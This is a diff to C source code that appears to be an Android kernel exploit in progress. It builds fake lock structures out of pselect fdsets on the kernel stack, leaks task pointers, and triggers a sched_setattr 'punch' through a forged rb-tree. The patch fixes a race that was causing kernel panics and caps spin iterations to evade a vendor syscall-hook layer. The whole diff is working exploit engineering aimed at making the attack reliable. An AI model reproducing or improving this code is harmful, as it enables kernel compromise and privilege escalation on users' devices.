@@ -507,7 +507,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
        * (clean miss, roll-10 class).
        */
       uint64_t ghost_task = (uint64_t)init_task;
-      {
+      if (!env_flag("MODE4_GHOST_TASK_INITTASK", 0)) {
         uintptr_t self_task = jc2_self_task_leak();
         if (self_task)
           ghost_task = (uint64_t)self_task;
@@ -2439,9 +2439,15 @@ void do_pselect_fake_lock_route(void) {
     if (env_flag("MODE4_NO_CONSUMER", 0)) {
     atomic_store(&punch_consume_go, 0);
       pr_info("pselect NO_CONSUMER=1 (no sched_setattr punch; survive-test)\n");
-    } else {
+    } else if (!env_flag("MODE4_JC2_SPINSTAMP", 0)) {
       atomic_store(&punch_consume_go, route_attempt);
     }
+    /* SPINSTAMP: the consumer is armed AFTER the spin's FINAL stamp (the
+     * waiter thread stores punch_consume_go itself on spin exit) — arming
+     * here lets the punch walk race the last fdset re-copy: the walk reads
+     * a half-written stamp and rb_insert_color derefs the garbage (the
+     * 2/2 stability-run KP). With the flag still 0 the consumer idles on
+     * its seq loop while the waiter owns the fdsets exclusively. */
 
     struct timeval timeout = {
       .tv_sec = PSELECT_TIMEOUT_SEC,
@@ -2591,6 +2597,12 @@ void do_pselect_fake_lock_route(void) {
        * delivery iterations are pure exposure).
        */
       int mark_every = env_int_range("SPIN_MARK_EVERY", 16, 0, 1000);
+      /* SPIN_MAX_ITERS: hard cap on re-stamps. Exposure to the oplus
+       * syscall-hook layer grows with iteration count (jc17 KP'd at
+       * ~96; jc12's 253-iter run survived once — probabilistic). 32
+       * keeps ~5ms stamp freshness (12x better than the frozen single
+       * stamp) at 1/3 the storm size. 0 = uncapped (QEMU default). */
+      int max_iters = env_int_range("SPIN_MAX_ITERS", 0, 0, 100000);
       {
         int sfd = open("/storage/emulated/0/ghostlock_logs/stage.txt",
                        O_WRONLY | O_CREAT | O_APPEND, 0644);
@@ -2629,6 +2641,9 @@ void do_pselect_fake_lock_route(void) {
             close(sfd);
           }
         }
+        if (max_iters && iters >= max_iters) {
+          break;
+        }
         if (atomic_load(&consumer_calls) > 0) {
           /* STOP THE MOMENT THE PUNCH STARTS (calls, not success —
            * success is post-setattr): the chain walk mutates the ghost's
@@ -2662,6 +2677,12 @@ void do_pselect_fake_lock_route(void) {
       pr_info("JC2 SPINSTAMP: %d re-stamps over punch window (succ=%d)\n",
               iters, (int)atomic_load(&consumer_success));
       errno = 0;
+      /* Handoff (the race fix): every fdset re-copy is done — the stamp
+       * on the waiter's kernel stack is FINAL and this thread is about
+       * to go quiescent in the blocking select. Only NOW may the
+       * consumer punch: arm it with the route seq. */
+      if (!env_flag("MODE4_NO_CONSUMER", 0))
+        atomic_store(&punch_consume_go, route_attempt);
     }
     int ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
     int saved_errno = errno;
